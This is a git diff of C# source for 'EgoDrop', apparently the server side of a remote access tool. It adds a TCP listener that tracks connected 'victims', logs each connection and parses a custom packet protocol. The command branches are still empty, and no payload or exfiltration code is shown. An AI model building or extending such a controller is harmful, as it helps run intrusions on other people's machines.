@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Configuration;
+using System.Data;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
@@ -12,6 +13,7 @@ namespace EgoDrop
     public class clsTcpListener : clsListener
     {
         private Socket m_sktSrv { get; set; }
+        public Dictionary<string, clsVictim> m_dicVictim = new Dictionary<string, clsVictim>();
 
         public clsTcpListener(string szName, int nPort, string szDescription)
         {
@@ -19,6 +21,7 @@ namespace EgoDrop
             m_nPort = nPort;
             m_szDescription = szDescription;
             m_Protocol = clsSqlite.enListenerProtocol.TCP;
+            m_stListener = new clsSqlite.stListener(m_szName, m_Protocol, m_nPort, m_szName, DateTime.Now);
 
             m_sktSrv = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         }
@@ -57,8 +60,6 @@ namespace EgoDrop
             if (ar == null || ar.AsyncState == null)
                 return;
 
-
-
             Socket sktSrv = (Socket)ar.AsyncState;
             try
             {
@@ -69,7 +70,7 @@ namespace EgoDrop
                 sktSrv.BeginAccept(new AsyncCallback(fnBeginAcceptCallback), sktSrv);
                 
                 Socket sktClnt = sktSrv.EndAccept(ar);
-                clsVictim victim = new clsVictim(sktClnt);
+                clsVictim victim = new clsVictim(sktClnt, this);
 
                 sktClnt.BeginReceive(
                     victim.m_abBuffer,
@@ -78,6 +79,8 @@ namespace EgoDrop
                     SocketFlags.None,
                     new AsyncCallback(fnBeginRecvCallback), victim
                 );
+
+                MessageBox.Show(sktClnt.RemoteEndPoint.ToString());
             }
             catch (Exception ex)
             {
@@ -94,11 +97,47 @@ namespace EgoDrop
             try
             {
                 Socket skt = victim.m_sktClnt;
+                clsEDP edp = null;
+
                 int nRecvLength = 0;
                 byte[] abStaticRecvBuffer = new byte[clsEDP.HEADER_SIZE];
                 byte[] abDynamicRecvBuffer = new byte[clsEDP.HEADER_SIZE];
 
+                do
+                {
+                    abStaticRecvBuffer = new byte[clsEDP.HEADER_SIZE];
+                    nRecvLength = skt.Receive(abStaticRecvBuffer);
+                    abDynamicRecvBuffer = clsTools.fnabCombineBytes(abDynamicRecvBuffer, abStaticRecvBuffer);
 
+                    if (nRecvLength <= 0)
+                        break;
+                    else if (abDynamicRecvBuffer.Length < clsEDP.HEADER_SIZE)
+                        continue;
+                    else
+                    {
+                        var headerInfo = clsEDP.fnGetHeader(abDynamicRecvBuffer);
+                        while (abDynamicRecvBuffer.Length - clsEDP.HEADER_SIZE >= headerInfo.nLength)
+                        {
+                            edp = new clsEDP(abDynamicRecvBuffer);
+                            abDynamicRecvBuffer = edp.m_abMoreData;
+                            headerInfo = clsEDP.fnGetHeader(abDynamicRecvBuffer);
+
+                            if (edp.m_nCommand == 0)
+                            {
+
+                            }
+                            else if (edp.m_nCommand == 1)
+                            {
+
+                            }
+                            else if (edp.m_nCommand == 2)
+                            {
+
+                            }
+                        }
+                    }
+                }
+                while (nRecvLength > 0);
             }
             catch (Exception ex)
             {
